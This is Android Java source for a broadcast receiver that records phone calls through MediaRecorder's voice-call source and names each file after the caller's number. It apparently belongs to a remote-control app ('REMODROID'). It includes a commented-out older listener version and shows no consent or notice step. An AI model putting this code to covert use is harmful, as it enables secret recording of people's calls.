package com.remo.features.broadcastReceivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import com.remo.App;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class call_rec extends BroadcastReceiver{
    private static boolean isRecording = false;
    private static boolean isOutCall = false;
    private static String mLastState;
    private MediaRecorder mediaRecorder;
    private static int a = 0;
    private static String b = "";
    private String number = "";
    private static final File RecordsPath = new File (App.get().getApplicationContext().getFilesDir().getAbsolutePath(),"Rec");
    private static int CurrentState = TelephonyManager.CALL_STATE_IDLE;
   // private final PhoneStateListener L = new CallRecorder();


   @Override
    public void onReceive(Context context, Intent intent) {
//        ((TelephonyManager) Objects.requireNonNull(
//                context.getSystemService(Context.TELEPHONY_SERVICE))).listen(L, PhoneStateListener.LISTEN_CALL_STATE);//32


       if (intent.getAction().equals("android.intent.action.PHONE_STATE")) {

           String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
           if (!state.equals(mLastState)) {
               mLastState = state;
               if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {

                   String formatted_date = new SimpleDateFormat("yyyy.MM.dd_HH.mm.ss",Locale.US).format(new Date());
                   startRecording(number + "_" + (isOutCall?"OUT":"IN") + "_"+ formatted_date);



               } else if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                   isOutCall = false;
                   number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);

               } else if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                   Log.d("REMODROID", "IDLE");
                   if (isRecording){
                       stopRecording();
                   }
               }
           }
       } else if (intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")) {
           number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
           isOutCall = true;
       }
   }



   private void startRecording(String outputfile) {
       try {
           isRecording = true;
           Log.d("REMODROID", "startRecording "+outputfile);
           mediaRecorder = new MediaRecorder();
           mediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
        //   mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
           mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
           mediaRecorder.setOutputFile(outputfile);
           mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
           mediaRecorder.prepare();
           mediaRecorder.start();
       }catch (IOException e){
           isRecording = false;
       }
   }

    private void stopRecording(){
        Log.d("REMODROID", "stopRecording ");
       isRecording = false;
        mediaRecorder.stop();
        mediaRecorder.release();
        mediaRecorder = null;
    }


//
//
//    private final class CallRecorder extends PhoneStateListener {
//
//        CallRecorder() {
//            Log.d("REMODROID",RecordsPath.getAbsolutePath());
//
//            if(!RecordsPath.exists()){
//                Log.d("REMODROID",
//                                RecordsPath.mkdir()?
//                                "Records Location Made now":
//                                "Records Location Made before");
//            }
//
//
//        }
//
//        @Override
//        public void onCallStateChanged(int state, String incomingNumber) {
//            CurrentState = state;
//            int i2 = 0;
//            if (state != a) {
//                switch (state) {
//                    case TelephonyManager.CALL_STATE_IDLE:
//                        Log.d("REMODROID","Idle");
//                        b = "";
//                        if (a == 2) {
//                            mediaRecorder.stop();
//                            mediaRecorder.release();
//                            mediaRecorder = null;
//                        }
//                        if (mediaRecorder != null) {
//                            try {
//                                mediaRecorder.stop();
//                                mediaRecorder.release();
//                                mediaRecorder = null;
//                            } catch (Exception e) {
//                            }
//                        }
//                        a = 0;
//                        return;
//                    case TelephonyManager.CALL_STATE_RINGING:
//                        Log.d("REMODROID","Ringing");
//                        a = 1;
//                        Log.d("REMODROID","incomingNumber:" + incomingNumber);
//                        b = incomingNumber;
//                        return;
//                    case TelephonyManager.CALL_STATE_OFFHOOK:
//                        Log.d("REMODROID","OFFHOOK");
//
//                        try {
//                            if (getSize(RecordsPath) > 52428800) {
//                                deleteAllCalls(RecordsPath);
//                            }
//                        } catch (Exception e2) {
//                        }
//                        try {
//                            String str2;
//                            String formatted_date = new SimpleDateFormat("yyyy.MM.dd  HH.mm.ss",Locale.US).format(new Date());
//                            if (a == 1 || b.length() > 0) {
//                                str2 = RecordsPath + "/Call-" + b + "-IN-" + formatted_date + ".mp3";
//                                b = "";
//                                Log.d("REMODROID","INCOMING STATE");
//                            } else {
//                                while (number.equals("")) {//number.equals("") && i2 < 60
//                                    int i3 = i2 + 1;
//                                    try {
//                                        Thread.sleep(100);
//                                        Log.d("REMODROID","Out Going Waiting......");
//                                        i2 = i3;
//                                    } catch (InterruptedException e3) {
//                                        e3.printStackTrace();
//                                        i2 = i3;
//                                    }
//                                }
//                                String str3 = RecordsPath + "/Call-" + number + "-OUT-" + formatted_date + ".mp3";
//                                try {
//                                    Thread.sleep(100);
//                                    Log.d("REMODROID","Out Going Waiting......");
//                                } catch (InterruptedException e32) {
//                                    e32.printStackTrace();
//                                }
//                                number = "";
//                                str2 = str3;
//                            }
//                            a = 2;
//                            mediaRecorder = new MediaRecorder();
//                            try {
//                                mediaRecorder.setAudioSource(4);
//                            } catch (Exception e4) {
//                                mediaRecorder.setAudioSource(1);
//                            }
//                            try {
//                                mediaRecorder.setOutputFormat(2);
//                                mediaRecorder.setOutputFile(str2);
//                                mediaRecorder.setAudioEncoder(3);
//                                try {
//                                    mediaRecorder.prepare();
//                                } catch (IOException e5) {
//                                    e5.printStackTrace();
//                                }
//                                mediaRecorder.start();
//                                return;
//                            } catch (Exception e6) {
//                                e6.printStackTrace();
//                                return;
//                            }
//                        } catch (Exception e7) {
//                            if (mediaRecorder != null) {
//                                try {
//                                    mediaRecorder.stop();
//                                    mediaRecorder.release();
//                                    mediaRecorder = null;
//                                } catch (Exception e8) {
//                                    return;
//                                }
//                            }
//                        }
//                    default:
//                        if (mediaRecorder != null) {
//                            mediaRecorder.stop();
//                            mediaRecorder.release();
//                            mediaRecorder = null;
//                        }
//                        return;
//                }
//
//            }
//        }
//


//        private long getSize(File file) {
//            if (!file.isDirectory()) {
//                return file.length();
//            }
//            long j = 0;
//            for (File file2 : file.listFiles()) {
//                if (file2.getName().startsWith("Call--")) {
//                    //               file2.delete();
//                } else {
//                    j += getSize(file2);
//                }
//            }
//            return j;
//        }
//
//        private  void deleteAllCalls(File file) {
//            if (file.isDirectory()) {
//                for (File file2 : file.listFiles()) {
//                    if (file2.getName().startsWith("Call")) {
//                        //           file2.delete();
//                    }
//                }
//            }
//        }

    //   }





}
